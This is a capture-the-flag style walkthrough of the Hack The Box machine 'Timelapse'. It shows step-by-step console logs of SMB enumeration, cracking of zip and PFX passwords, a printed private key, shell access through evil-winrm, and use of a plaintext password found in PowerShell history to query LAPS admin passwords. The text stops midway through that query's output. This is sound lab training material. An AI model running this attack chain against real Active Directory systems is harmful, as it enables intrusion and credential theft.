# Timelapse

This is my write-up for the room Timelapse


## Difficulty
My Difficulty: Medium (this box I was forced to really dig for enumeration and learn a few things that I have never done before. 

Try Hackme Difficulty: Easy

![Timelapse](https://user-images.githubusercontent.com/68706090/163875576-d0272fa7-6daf-4598-a866-e536388a6fe6.png)



# Enumeration

### NMAP

``` Console
noob2uub@kali:~/Documents/HTB/Timelapse$ nmap -sC -sV -Pn -p 1-65535 10.10.11.152
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-18 12:44 PDT
Stats: 0:07:03 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 25.26% done; ETC: 13:12 (0:20:54 remaining)
Nmap scan report for 10.10.11.152
Host is up (0.074s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2022-04-19 04:17:16Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2022-04-19T04:18:46+00:00; +7h58m54s from scanner time.
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49696/tcp open  msrpc             Microsoft Windows RPC
60597/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h58m53s, deviation: 0s, median: 7h58m53s
| smb2-time: 
|   date: 2022-04-19T04:18:08
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2116.31 seconds


```
We see that port 139 and port 446 are open so lets take a look at SMBMAP

### SMBMAP

``` console
noob2uub@kali:~/Documents/HTB/Timelapse$ smbmap -H 10.10.11.152
[+] IP: 10.10.11.152:445	Name: 10.10.11.152       
```

### SMBCLIENT

```console
noob2uub@kali:~/Documents/HTB/Timelapse$ smbclient -N -L 10.10.11.152

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Shares          Disk      
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
Lets take a look at the Shares folder

``` console
smb: \> ls
  .                                   D        0  Mon Oct 25 08:39:15 2021
  ..                                  D        0  Mon Oct 25 08:39:15 2021
  Dev                                 D        0  Mon Oct 25 12:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 08:48:42 2021

		6367231 blocks of size 4096. 1482245 blocks available
smb: \> cd Dev
smb: \Dev\> get winrm_backup.zip
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (9.0 KiloBytes/sec) (average 9.0 KiloBytes/sec)
```

We see that we can get the winrm_backup.zip file so lets start with that, then go take a look at HelpDesk

```console
smb: \helpdesk\> ls
  .                                   D        0  Mon Oct 25 08:48:42 2021
  ..                                  D        0  Mon Oct 25 08:48:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 07:57:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 07:57:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 07:57:40 2021
  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 07:57:44 2021

		6367231 blocks of size 4096. 1486491 blocks available
smb: \helpdesk\> 
smb: \helpdesk\> 
smb: \helpdesk\> get LAPS.x64.msi 
getting file \helpdesk\LAPS.x64.msi of size 1118208 as LAPS.x64.msi (1605.9 KiloBytes/sec) (average 1137.8 KiloBytes/sec)
smb: \helpdesk\> get LAPS_Datasheet.docx 
getting file \helpdesk\LAPS_Datasheet.docx of size 104422 as LAPS_Datasheet.docx (329.0 KiloBytes/sec) (average 940.7 KiloBytes/sec)
smb: \helpdesk\> get LAPS_OperationsGuide.docx 
getting file \helpdesk\LAPS_OperationsGuide.docx of size 641378 as LAPS_OperationsGuide.docx (1388.8 KiloBytes/sec) (average 1058.0 KiloBytes/sec)
smb: \helpdesk\> get LAPS_T
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \helpdesk\LAPS_T
smb: \helpdesk\> ls
```
I pulled the files down to take a look at them, but I am more interested in the .zip

``` console
noob2uub@kali:~/Documents/HTB/Timelapse$ unzip winrm_backup.zip 
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
   skipping: legacyy_dev_auth.pfx    incorrect password
```
Looks like the file is password protected, lets use FCRACK ZIP, I played with john for a minute but could not get it to work.

### FCRACKZIP

```console
noob2uub@kali:~/Documents/HTB/Timelapse$ fcrackzip -u -D -p /home/noob2uub/rockyou.txt /home/noob2uub/Documents/HTB/Timelapse/winrm_backup.zip 


PASSWORD FOUND!!!!: pw == supremelegacy
noob2uub@kali:~/Documents/HTB/Timelapse$ 
```
We see that we now have a pfx file

```console
noob2uub@kali:~/Documents/HTB/Timelapse$ unzip winrm_backup.zip 
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: legacyy_dev_auth.pfx    
noob2uub@kali:~/Documents/HTB/Timelapse$ ls
LAPS_Datasheet.docx  LAPS_OperationsGuide.docx  LAPS.x64.msi  legacyy_dev_auth.pfx  ports  winrm_backup.zip  zip.txt
noob2uub@kali:~/Documents/HTB/Timelapse$ 
```
Now lets see about opening the PFX file using John

### PRX2JOHN

```console
noob2uub@kali:~/Documents/HTB/Timelapse$ locate pfx2john
/usr/share/john/pfx2john.py
/usr/share/john/__pycache__/pfx2john.cpython-39.pyc
noob2uub@kali:~/Documents/HTB/Timelapse$ /usr/share/john/pfx2john.py legacyy_dev_auth.pfx 
legacyy_dev_auth.pfx:$pfxng$1$20$2000$20$eb755568327396de179c4a5d668ba8fe550ae18a$3082099c3082060f06092a864886f70d010701a0820600048205fc308205f8308205f4060b2a864886f70d010c0a0102a08204fe308204fa301c060a2a864886f70d010c0103300e04084408e3852b96a898020207d0048204d8febcd5536b4b831d491da6d53ca889d95f094572da48eed1a4a14cd88bbfff72924328212c0ff047b42d0b7062b3c6191bc2c23713f986d1febf6d9e1829cd6663d2677b4af8c7a25f7360927c498163168a2543fd722188558e8016f59819657759c27000d365a302da21eda4b73121dcc4eede60533b0ef0873a99b92cc7f824d029385fa8b6859950912cd0a257fa55f150c2135f2850832b3229033f2552f809e70010fab8868bb7d5bef7c20408dac3f67e367f4c3e3b81a555cdfe9e89c7bc44d6996f401f9a26e43094b6fa418a76d5b57579eeb534627a27fd46350a624b139d9ff4b124c9afbbbe42870026098bbc7d38b6b543ab6eff3cf2972c87dd2c0e703ef2a0120062a97279661b67ca596a650efde28e098c82fce01f50611e28d4a6d5d75af8bf965c07faa68331b9f66733deb32ee3628b156ee0ef8e63b732e3606f3c6c9453b49d15592648cd918deaf72889f3e0bcf42bfdb9cddae7e77c5934579d658bfea78800013f36de7e7fadd2f0ff96e78dedaba0593947f96989fad67e17470b49307b5199248fbad36a0dee42e480b30785810a4c17cc27b0e0ed3a99ddec9720a968f3ccbffb36752febbbca437ecacd6c93c6ef2ff6277de01545a482daf34d1faf38819737b7e4ef61004c2876715123fd0b8a4f6c03eb387fd50eaaf4977870a6c011c91f1c9093dc2aa0e2c72c0a5e1473ef89429b02ab1efbf09b096efecb65d6e772d8eb2ca2e72aa288749d6fdbf9b207592f3a9ad16676d9f0aba1fb2f180f7b715b6c2238a42c13b00f8dc26c41ababbca74b84b42294ff473a0f16c85ac7f2072981968f8b868885655f50ea81f06e5e65d269853e537e18268add9046681f9a6d0233d171f900b34cf0c63d299eb67d7a8ebfcfbf88395de5c7fd5bd1085d20cc56b3ca847e6f21fba58215ff91bed70e5f629c9257baa848f29fab2efb9170f8c51e680dde4d6d2eebaa602b24444f43ccfb607efa46f378539664c6309f51d82f67347fc689e855966069099dead6f19adadcf9c6a0d2c42401846eba828bffad6f7336df1ea091844f2074e976a5d2eb83db0646fb43b3faad564ac577781f29de95b7b21b6caf7f9de6d2d56150de098faf9a684b2a79083b3555455272874e9c427e1b1349b94c0baf73eee08832274df7c4ac23b68f66cb86ba0561e1bb83b0e920b4568371c89c2a80ed63308a4d9ce2e12d74de3f83fe5d93ab3aadd65a8821814f9981e20cdb86615d04ef9d45c30d692ad058212b33a0c8966414b3840a77af33b2fe85791a16e4922a9458cb584903515470d57607ce412e0699c883ddd40ad4983f9e6164879a19fc554781823782c89b47c3bf36a6eb4d33194753e85cb13e112a3e9fce98b72565961d1bace71a8086657bce391bdb2a5e4b8025b06984fbb2da341034e9750b33ef2a1dccddde7b867084faf8264a4379c17dfad736a382fa7510e674ca7fefba611cc64313242d3166a04165d4f70607bd988181f06ff4dca04035c14111c7d93a1169efcece8c3616e971131ff54c42a35f3c43f374131b8634999052aa7a479274f6b9d64e414d2775fcf8f7e68897032902547c92885136f0f14e04e62519a02c03a4d0bf412e517f4b51e42ff27b40d7222d722424c56abb1b183158fef0f9d04bbc45d5341a4cb26d03a5864a6f51b9bd315918aa491393a5b6dc622dad6b25e131e43077ab421c4bcd6ed6dfbd52afd4dcb19a27797cbf983181e2300d06092b06010401823711023100301306092a864886f70d0109153106040401000000305d06092a864886f70d01091431501e4e00740065002d00340061003500330034003100350037002d0063003800660031002d0034003700320034002d0038006400620036002d006500640031003200660032003500630032006100390062305d06092b060104018237110131501e4e004d006900630072006f0073006f0066007400200053006f0066007400770061007200650020004b00650079002000530074006f0072006100670065002000500072006f007600690064006500723082038506092a864886f70d010701a0820376048203723082036e3082036a060b2a864886f70d010c0a0103a08203423082033e060a2a864886f70d01091601a082032e0482032a308203263082020ea00302010202101d9989298acf11bb4193a1cff44e12df300d06092a864886f70d01010b050030123110300e06035504030c074c656761637979301e170d3231313032353134303535325a170d3331313032353134313535325a30123110300e06035504030c074c65676163797930820122300d06092a864886f70d01010105000382010f003082010a0282010100a55607a36216471ee2f34d23ad6171ce8b9eb34a872bf689bce78603bbfeaa1c16b835ff3114fe8834d04d9585af0310af28cf1a42c1e9bf7b68a70a50f986d1643bb5371ca1bdf34d4d15e3745415f672222a4a303adea01b617ef4ee60545e0f0271cf9be6183f0b1ba1191857c40ea73222e8d319803089ae02125999941ea4e1c9b156ffb3ce99ed60b3ab623755c5a0fbb5ccd3986882f776d65a6b35dc2f0e88a532513c90161adb6ac85a26998ac9a82cc249a5aef631b4a7584a2bb9a4eb0bc1491f107c75b6a97f7e35b2ca7a00adfbf8c06babb657d96ef8adcc0b635a4b33a8222e472cc8e7aee8d1a02c77bfa6572f428f085cc3304a8b1491f10203010001a3783076300e0603551d0f0101ff0404030205a030130603551d25040c300a06082b0601050507030230300603551d1104293027a025060a2b060104018237140203a0170c156c6567616379794074696d656c617073652e687462301d0603551d0e04160414ccd90ee4af209eb0752bfd81961eac2db1255819300d06092a864886f70d01010b050003820101005f8efb76bfde3efe96fdda72c84b8ae76bb0882aba9a9bdeba1fc905eadee91d93e510364caf5eeee7492f4cdd43e0fb650ae77d49a3eca2449b28da05817d4a357e66ef6174dca08b226875cf896dc6c73a2603a09dc0aa7457d7dedd04cb747b286c7aade2edbd4e0567e9e1be55d3789fcf01773f7f06b6adf88fb1f579d564ce604cdc8299e074726d06a9ae370ded9c42a680caa9eb9298ce9293bef335263848e6dc4686a6dd59b9f6952e308c6cb7606459c3aa0cebaec6175dd5ab65f758764ae4d68ffb929ac1dfc9f8cb3aae26343c36e19f1d78def222a0760c8860a72ac1dd5a232b1b65162cea1e52b9549a9af4ebd918fe79fbfb34846b6a403115301306092a864886f70d0109153106040401000000$86b99e245b03465a6ce0c974055e6dcc74f0e893:::::legacyy_dev_auth.pfx
noob2uub@kali:~/Documents/HTB/Timelapse$ 
```
Now to crack the Hash

### John

```console
noob2uub@kali:~/Documents/HTB/Timelapse$ john --wordlist=/home/noob2uub/Documents/Wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (?)     
1g 0:00:00:34 DONE (2022-04-18 12:20) 0.02871g/s 92812p/s 92812c/s 92812C/s thuglife06..thsco04
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

For more information on PFX files https://www.ssl.com/how-to/export-certificates-private-key-from-pkcs12-file-with-openssl/

### Extracting PFX File

```console
noob2uub@kali:~/Documents/HTB/Timelapse$ openssl pkcs12 -info -in legacyy_dev_auth.pfx -nodes
Enter Import Password:
MAC: sha1, Iteration 2000
MAC length: 20, salt length: 20
PKCS7 Data
Shrouded Keybag: pbeWithSHA1And3-KeyTripleDES-CBC, Iteration 2000
Bag Attributes
    Microsoft Local Key set: <No Values>
    localKeyID: 01 00 00 00 
    friendlyName: te-4a534157-c8f1-4724-8db6-ed12f25c2a9b
    Microsoft CSP Name: Microsoft Software Key Storage Provider
Key Attributes
    X509v3 Key Usage: 90 
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQClVgejYhZHHuLz
TSOtYXHOi56zSocr9om854YDu/6qHBa4Nf8xFP6INNBNlYWvAxCvKM8aQsHpv3to
pwpQ+YbRZDu1NxyhvfNNTRXjdFQV9nIiKkowOt6gG2F+9O5gVF4PAnHPm+YYPwsb
oRkYV8QOpzIi6NMZgDCJrgISWZmUHqThybFW/7POme1gs6tiN1XFoPu1zNOYaIL3
dtZaazXcLw6IpTJRPJAWGttqyFommYrJqCzCSaWu9jG0p1hKK7mk6wvBSR8QfHW2
qX9+NbLKegCt+/jAa6u2V9lu+K3MC2NaSzOoIi5HLMjnrujRoCx3v6ZXL0KPCFzD
MEqLFJHxAgMBAAECggEAc1JeYYe5IkJY6nuTtwuQ5hBc0ZHaVr/PswOKZnBqYRzW
fAatyP5ry3WLFZKFfF0W9hXw3tBRkUkOOyDIAVMKxmKzguK+BdMIMZLjAZPSUr9j
PJFizeFCB0sR5gvReT9fm/iIidaj16WhidQEPQZ6qf3U6qSbGd5f/KhyqXn1tWnL
GNdwA0ZBYBRaURBOqEIFmpHbuWZCdis20CvzsLB+Q8LClVz4UkmPX1RTFnHTxJW0
Aos+JHMBRuLw57878BCdjL6DYYhdR4kiLlxLVbyXrP+4w8dOurRgxdYQ6iyL4UmU
Ifvrqu8aUdTykJOVv6wWaw5xxH8A31nl/hWt50vEQQKBgQDYcwQvXaezwxnzu+zJ
7BtdnN6DJVthEQ+9jquVUbZWlAI/g2MKtkKkkD9rWZAK6u3LwGmDDCUrcHQBD0h7
tykwN9JTJhuXkkiS1eS3BiAumMrnKFM+wPodXi1+4wJk3YTWKPKLXo71KbLo+5NJ
2LUmvvPDyITQjsoZoGxLDZvLFwKBgQDDjA7YHQ+S3wYk+11q9M5iRR9bBXSbUZja
8LVecW5FDH4iTqWg7xq0uYnLZ01mIswiil53+5Rch5opDzFSaHeS2XNPf/Y//TnV
1+gIb3AICcTAb4bAngau5zm6VSNpYXUjThvrLv3poXezFtCWLEBKrWOxWRP4JegI
ZnD1BfmQNwKBgEJYPtgl5Nl829+Roqrh7CFti+a29KN0D1cS/BTwzusKwwWkyB7o
btTyQf4tnbE7AViKycyZVGtUNLp+bME/Cyj0c0t5SsvS0tvvJAPVpNejjc381kdN
71xBGcDi5ED2hVj/hBikCz2qYmR3eFYSTrRpo15HgC5NFjV0rrzyluZRAoGAL7s3
QF9Plt0jhdFpixr4aZpPvgsF3Ie9VOveiZAMh4Q2Ia+q1C6pCSYk0WaEyQKDa4b0
6jqZi0B6S71un5vqXAkCEYy9kf8AqAcMl0qEQSIJSaOvc8LfBMBiIe54N1fXnOeK
/ww4ZFfKfQd7oLxqcRADvp1st2yhR7OhrN1pfl8CgYEAsJNjb8LdoSZKJZc0/F/r
c2gFFK+MMnFncM752xpEtbUrtEULAKkhVMh6mAywIUWaYvpmbHDMPDIGqV7at2+X
TTu+fiiJkAr+eTa/Sg3qLEOYgU0cSgWuZI0im3abbDtGlRt2Wga0/Igw9Ewzupc8
A5ZZvI+GsHhm0Oab7PEWlRY=
-----END PRIVATE KEY-----
PKCS7 Data
Certificate bag
Bag Attributes
    localKeyID: 01 00 00 00 
subject=CN = Legacyy

issuer=CN = Legacyy

-----BEGIN CERTIFICATE-----
MIIDJjCCAg6gAwIBAgIQHZmJKYrPEbtBk6HP9E4S3zANBgkqhkiG9w0BAQsFADAS
MRAwDgYDVQQDDAdMZWdhY3l5MB4XDTIxMTAyNTE0MDU1MloXDTMxMTAyNTE0MTU1
MlowEjEQMA4GA1UEAwwHTGVnYWN5eTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
AQoCggEBAKVWB6NiFkce4vNNI61hcc6LnrNKhyv2ibznhgO7/qocFrg1/zEU/og0
0E2Vha8DEK8ozxpCwem/e2inClD5htFkO7U3HKG9801NFeN0VBX2ciIqSjA63qAb
YX707mBUXg8Ccc+b5hg/CxuhGRhXxA6nMiLo0xmAMImuAhJZmZQepOHJsVb/s86Z
7WCzq2I3VcWg+7XM05hogvd21lprNdwvDoilMlE8kBYa22rIWiaZismoLMJJpa72
MbSnWEoruaTrC8FJHxB8dbapf341ssp6AK37+MBrq7ZX2W74rcwLY1pLM6giLkcs
yOeu6NGgLHe/plcvQo8IXMMwSosUkfECAwEAAaN4MHYwDgYDVR0PAQH/BAQDAgWg
MBMGA1UdJQQMMAoGCCsGAQUFBwMCMDAGA1UdEQQpMCegJQYKKwYBBAGCNxQCA6AX
DBVsZWdhY3l5QHRpbWVsYXBzZS5odGIwHQYDVR0OBBYEFMzZDuSvIJ6wdSv9gZYe
rC2xJVgZMA0GCSqGSIb3DQEBCwUAA4IBAQBfjvt2v94+/pb92nLIS4rna7CIKrqa
m966H8kF6t7pHZPlEDZMr17u50kvTN1D4PtlCud9SaPsokSbKNoFgX1KNX5m72F0
3KCLImh1z4ltxsc6JgOgncCqdFfX3t0Ey3R7KGx6reLtvU4FZ+nhvlXTeJ/PAXc/
fwa2rfiPsfV51WTOYEzcgpngdHJtBqmuNw3tnEKmgMqp65KYzpKTvvM1JjhI5txG
hqbdWbn2lS4wjGy3YGRZw6oM667GF13Vq2X3WHZK5NaP+5Kawd/J+Ms6riY0PDbh
nx143vIioHYMiGCnKsHdWiMrG2UWLOoeUrlUmpr069kY/nn7+zSEa2pA
-----END CERTIFICATE-----
```

I created a timeless.cert and timeless.key (meant timelapse, but typed it out  wrong)

I did get stumped on this one, so I found out about evil-winrm and installed that on my machine and ran it.

### Evil-WINRM

``` console
noob2uub@kali:~/Documents/HTB/Timelapse$ evil-winrm -S -i 10.10.11.152 -c timless.cert -k timeless.key  -P 5986

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\legacyy\Documents> 
```

This provided me a low level shell, now lets hunt for the user flag and then attempt to escalate priveledges. 

```console
*Evil-WinRM* PS C:\Users\legacyy\Documents> cd ..
*Evil-WinRM* PS C:\Users\legacyy> ls


    Directory: C:\Users\legacyy


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---       10/25/2021   8:25 AM                Desktop
d-r---       10/25/2021   8:22 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos


*Evil-WinRM* PS C:\Users\legacyy> cd Desktop
*Evil-WinRM* PS C:\Users\legacyy\Desktop> ls


    Directory: C:\Users\legacyy\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/18/2022   6:24 PM             34 user.txt


*Evil-WinRM* PS C:\Users\legacyy\Desktop> cat user.txt
```

# Priveledge Escalation

Lets look around for what has been run in powershell to find out more information. Looking into the Users folder I found a svc_deploy user account. I found this site that will help me navigate to the powershell history file.

### Dir - Force (to show hidden folders)

```console
*Evil-WinRM* PS C:\Users\legacyy> dir -Force


    Directory: C:\Users\legacyy


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--h--       10/25/2021   8:22 AM                AppData
d--hsl       10/25/2021   8:22 AM                Application Data
d--hsl       10/25/2021   8:22 AM                Cookies
d-r---       10/25/2021   8:25 AM                Desktop
d-r---       10/25/2021   8:22 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d--hsl       10/25/2021   8:22 AM                Local Settings
d-r---        9/15/2018  12:19 AM                Music
d--hsl       10/25/2021   8:22 AM                My Documents
d--hsl       10/25/2021   8:22 AM                NetHood
d-r---        9/15/2018  12:19 AM                Pictures
d--hsl       10/25/2021   8:22 AM                PrintHood
d--hsl       10/25/2021   8:22 AM                Recent
d-----        9/15/2018  12:19 AM                Saved Games
d--hsl       10/25/2021   8:22 AM                SendTo
d--hsl       10/25/2021   8:22 AM                Start Menu
d--hsl       10/25/2021   8:22 AM                Templates
d-r---        9/15/2018  12:19 AM                Videos
-a-h--         3/3/2022  10:10 PM         262144 NTUSER.DAT
-a-hs-       10/25/2021   8:22 AM          61440 ntuser.dat.LOG1
-a-hs-       10/25/2021   8:22 AM          65536 ntuser.dat.LOG2
-a-hs-       10/25/2021   8:22 AM          65536 NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM.blf
-a-hs-       10/25/2021   8:22 AM         524288 NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000001.regtrans-ms
-a-hs-       10/25/2021   8:22 AM         524288 NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000002.regtrans-ms
---hs-       10/25/2021   8:22 AM             20 ntuser.ini


*Evil-WinRM* PS C:\Users\legacyy> 
```

### Powershell History (consolehost_history.txt)

```console
Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline> ls


    Directory: C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/3/2022  11:46 PM            434 ConsoleHost_history.txt


*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline> cat ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline> 
```
When reading the ConsoleHost_History.txt I decided to run those commands since it looks like it changes users to svc_deploy

``` console
*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline> cat ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline> $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline> $p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline> $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline> invoke-command -computername localhost -credential $c -port 5986 -usessl -
The value of the FilePath parameter must be a Windows PowerShell script file. Enter the path to a file with a .ps1 file name extension and try the command again.
Parameter name: filePath
At line:1 char:1
+ invoke-command -computername localhost -credential $c -port 5986 -use ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Invoke-Command], ArgumentException
    + FullyQualifiedErrorId : System.ArgumentException,Microsoft.PowerShell.Commands.InvokeCommandCommand
*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline> SessionOption $so -scriptblock {whoami}
The term 'SessionOption' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ SessionOption $so -scriptblock {whoami}
+ ~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (SessionOption:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline> invoke-command -computername localhost -credential $c -port 5986 -usessl -
The value of the FilePath parameter must be a Windows PowerShell script file. Enter the path to a file with a .ps1 file name extension and try the command again.
Parameter name: filePath
At line:1 char:1
+ invoke-command -computername localhost -credential $c -port 5986 -use ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Invoke-Command], ArgumentException
    + FullyQualifiedErrorId : System.ArgumentException,Microsoft.PowerShell.Commands.InvokeCommandCommand
*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline> SessionOption $so -scriptblock {whoami}
The term 'SessionOption' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ SessionOption $so -scriptblock {whoami}
+ ~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (SessionOption:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
timelapse\svc_deploy
*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {net user svc_deploy}
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 12:12:37 PM
Password expires             Never
Password changeable          10/26/2021 12:12:37 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   4/18/2022 9:27:13 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.

*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline> 
```
For more information on LAPS files and retrieving passwords https://smarthomepursuits.com/export-laps-passwords-powershell/

Now lets run this command to pull the passwords from the LAPS File

```console
*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime}


PSComputerName              : localhost
RunspaceId                  : d416ee51-82f0-43f4-89ec-99b3d038a162
